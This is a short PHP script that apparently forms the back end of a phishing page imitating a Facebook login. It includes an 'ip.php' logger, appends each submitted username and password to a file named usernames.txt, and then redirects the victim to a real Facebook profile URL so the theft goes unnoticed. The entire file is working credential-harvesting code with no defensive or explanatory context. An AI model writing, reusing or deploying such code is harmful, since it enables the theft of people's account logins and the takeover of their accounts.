<?php
include 'ip.php';
file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com/profile.php?id=100052023841766 ');
exit();